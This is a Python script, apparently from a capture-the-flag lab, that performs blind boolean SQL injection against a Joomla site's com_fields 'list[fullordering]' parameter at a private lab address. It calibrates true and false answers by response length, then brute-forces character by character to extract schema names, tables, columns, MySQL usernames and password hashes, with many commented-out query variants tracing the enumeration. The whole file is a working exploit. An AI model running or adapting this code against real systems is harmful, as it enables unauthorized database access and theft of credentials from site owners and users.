#!/usr/bin/env python3
import requests
import string
import urllib
import sys


def getChar(st):
    output = "CHAR("
    for ch in st:
        output += f"{ord(ch)},"
    output = output[:-1] + ")"
    return output

def getConcat(st):
    output = "CONCAT("
    for ch in st:
        output += f"CHAR({ord(ch)}),"
    output = output[:-1] + ")"
    return output




def test(st):
    orig = "http://10.10.156.48/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE%20WHEN%20(TEST)%20THEN%201573%20ELSE%201573*(SELECT%201573%20FROM%20DUAL%20UNION%20SELECT%209674%20FROM%20DUAL)%20END)"
    st=urllib.parse.quote(st)
    r = requests.get(orig.replace("TEST", st))
    l = len(r.text)
    if l > 3530:
        return True
    else:
        return False

#FALSE
if test("""char(42,41)=char(41,40)"""):
    print("ERROR")
    exit()
if test("""char(42)=char(41)"""):
    print("ERROR")
    exit()

#TRUE
if not test("""char(42,43)=char(42,43)"""):
    print("ERROR")
    exit()
if not test("""char(42)=char(42)"""):
    print("ERROR")
    exit()



skip = False

import threading
def skipper():
    global skip
    while True:
        try:
            input()
        except KeyboardInterrupt:
            sys.exit(1)
        skip = True


threading.Thread(target=skipper).start()




try:
    for w in range(0,175): # word[w]
        print()
        skip = False
        word = f"{w}: " 
        for i in range(1, 2000):
            if skip:
                break
            for ch in range(33, 127): # ALL
            #for ch in range(65, 96): # CHARS
            #for ch in range(97, 123): # lowercase CHARS
            #for ch in range(48, 58): # numbers
                if skip:
                    break
                #tst = f"SUBSTRING((DATABASE()),{i},1)=char({ch})"
                #tst = f"SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {w},1),{i},1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={getConcat('USER')} LIMIT {w},1),{i},1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT COUNT(*) FROM information_schema.tables), {i}, 1)=char({ch})" 
                #tst = f"SUBSTRING((DATABASE()),{i},1)=char({ch})"
                #tst = f"SUBSTRING((SELECT name FROM information_schema.databases LIMIT {w},1),{i},1)=char({ch})"
                #tst = f"SUBSTRING((SELECT USER FROM JOOMLA.USER LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT USER FROM MYSQL.USER LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT MYSQL.USER FROM MYSQL.USER LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT {getConcat('MYSQL.USER')} FROM {getConcat('MYSQL.USER')} LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT TEST.USER FROM TEST.USER LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT TEST.USER FROM TEST.USER LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={getConcat('USER')} LIMIT {w},1),{i},1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT table_name FROM information_schema.tables WHERE schema_name=TEST LIMIT {w},1),{i},1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={getConcat('user')} LIMIT {w},1), {i},1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT user FROM user LIMIT {w},1), {i},1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT COUNT(*) FROM (TEST.USER) LIMIT {w},1), {i}, 1)=char({ch})" 
                #tst = f"SUBSTRING((SELECT user FROM user LIMIT {w},1), {i}, 1)=char({ch})"
                #tst = f"""SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_name={getChar('user')} LIMIT {w},1),{i},1)=char({ch})""" 
                #tst = f"""SUBSTRING((SELECT }table_schema FROM information_schema.tables WHERE table_name={getChar("user")} LIMIT {w},1),{i},1)=char({ch})""" 
                #tst = f"""SUBSTRING((SELECT table_schema FROM information_schema.columns WHERE column_name={getChar("user")} LIMIT {w},1),{i},1)=char({ch})""" 
                #tst = f"""SUBSTRING((SELECT user FROM mysql.user LIMIT {w},1),{i},1)=char({ch})""" 
                #tst = f"""SUBSTRING((SELECT password FROM mysql.user WHERE user LIKE {getChar("jonah")} LIMIT {w},1),{i},1)=char({ch})""" 
                #tst = f"""SUBSTRING((SELECT user FROM mysql.user LIMIT {w},1),{i},1)=char({ch})""" 
                tst = f"""SUBSTRING((SELECT password FROM mysql.user LIMIT {w},1),{i},1)=char({ch})""" 
                print(f"{tst} : {word}    - {chr(ch)}" ,end="\r")
                if test(tst):
                    found = True
                    word += chr(ch)
                    break
            
    print("\n\ndone")


except KeyboardInterrupt:
    print("\n\n\n")
    sys.exit(1)
